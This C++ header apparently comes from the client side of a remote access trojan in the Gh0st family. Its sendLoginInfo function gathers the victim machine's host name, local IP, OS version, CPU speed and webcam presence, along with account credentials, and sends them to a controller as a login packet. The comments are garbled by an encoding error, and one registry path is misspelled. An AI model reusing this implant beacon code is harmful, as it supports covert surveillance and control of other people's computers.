#pragma once
#include "Include/RegEditEx.h"
#include <Vfw.h>

#pragma  comment(lib,"vfw32.lib")

#pragma pack(1)      //--�ֽڶ���
typedef struct 
{
	BYTE             bToken;         //    = 1    ���߷�������ʲô���
	char             UserName[50];   //    50
	char             Password[50];   //    50
	IN_ADDR          IPAddress;      //    ����32λ��IPv�ĵ�ַ���ݽṹ
	char             HostName[50];   //    ������
	bool             bIsWebCam;      //    �Ƿ�������ͷ
	OSVERSIONINFOEX  OsVerInfoEx;    //    �汾��Ϣ
	int              CPUClockMhz;    //    CPU��Ƶ
	DWORD            dwSpeed;        //    �����ٶ�
}lOGININFO;
#pragma pack()      //--�ֽڶ���

//�õ�������
UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char strSubKey[1024];
	memset(lpBuffer,0,uSize);
	
	memset(strSubKey, 0, sizeof(strSubKey));

	wsprintf(strSubKey, R"(SYSTEM\CurrentControlst\Services\%s)", lpServiceName);

	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char*)lpBuffer, NULL, uSize, 0);

	if (lstrlen(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return lstrlen(lpBuffer);
}

DWORD GetCPUClockMhz()
{
	HKEY     hKey;
	DWORD    dwCPUMhz;
	DWORD    dwBytes = sizeof(DWORD);
	DWORD    dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return dwCPUMhz;
}

bool IsWebCam()
{
	bool bRet = false;

	char lpszName[100], lpszVer[50];

	for (int i = 0;i < 10 && !bRet;i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

int sendLoginInfo(LPCTSTR strServiceName,CClientSocket * pClient,DWORD dwSpeed,const char *username, const char *password)
{
	lOGININFO login_info;   //CCCCCCCC��ջ��
	memset(&login_info, 0, sizeof(login_info));   //���ջ�ϵ�����
	//����
	login_info.bToken = TOKEN_LOGIN;
	//�˺�����
	lstrcpy(login_info.UserName, username);
	lstrcpy(login_info.Password, password);

	//�����ٶ�
	login_info.dwSpeed = dwSpeed;

	//���ӵ�IP��ַ
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);

	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	memcpy(&login_info.IPAddress, (void*)&sockAddr.sin_addr, sizeof(IN_ADDR));

	//������
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));
	memcpy(&login_info.HostName, hostname, sizeof(login_info.HostName));

	//CPU
	login_info.CPUClockMhz = GetCPUClockMhz();
	//�Ƿ�������ͷ
	login_info.bIsWebCam = IsWebCam();
	//-------------------
	pClient->Send((LPBYTE)&login_info, sizeof(login_info));

	return 0;
}